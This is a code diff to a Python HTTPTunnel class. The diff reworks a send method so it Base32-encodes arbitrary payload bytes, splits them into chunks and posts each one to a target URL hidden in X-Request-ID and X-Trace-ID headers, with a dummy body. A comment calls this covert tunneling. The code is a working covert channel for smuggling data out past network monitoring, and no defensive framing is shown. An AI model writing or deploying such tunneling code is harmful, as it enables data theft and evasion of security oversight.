@@ -8,21 +8,33 @@ class HTTPTunnel:
     """
 
     @staticmethod
-    def send(payload_bytes: bytes, target_url: str):
-        # Base64 encode the payload
-        encoded: str = base64.b64encode(payload_bytes).decode('utf-8')
+    def send(payload_bytes: bytes, target_url: str, session_id: str = "default", should_stop=None):
+        # Base32 is safer for headers and matches the receiver
+        encoded: str = base64.b32encode(payload_bytes).decode('utf-8').rstrip('=')
         
-        # Split payload if it's too long for a single header
-        # X-Request-ID for part 1, X-Trace-ID for part 2
-        mid = len(encoded) // 2
-        headers = {
-            "X-Request-ID": encoded[:mid],
-            "X-Trace-ID": encoded[mid:]
-        }
+        # Split payload into chunks to avoid header size limits
+        chunk_size = 200 
+        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
+        total = len(chunks)
         
         with httpx.Client() as client:
-            response = client.post(target_url, headers=headers, json={"ping": "pong"})
-            return response
+            for i, chunk in enumerate(chunks):
+                if should_stop and should_stop():
+                    break
+                
+                # Format: session_id:chunk_index:total_chunks
+                headers = {
+                    "X-Request-ID": f"{session_id}:{i}:{total}",
+                    "X-Trace-ID": chunk
+                }
+                
+                try:
+                    client.post(target_url, headers=headers, json={"p": "p"}, timeout=5.0)
+                except Exception as e:
+                    print(f"Error sending HTTP tunnel chunk {i}: {e}")
+                    # Continue attempting other chunks or break? 
+                    # For covert tunneling, we usually continue or retry.
+                    continue
 
     @staticmethod
     def receive_from_headers(headers: dict):
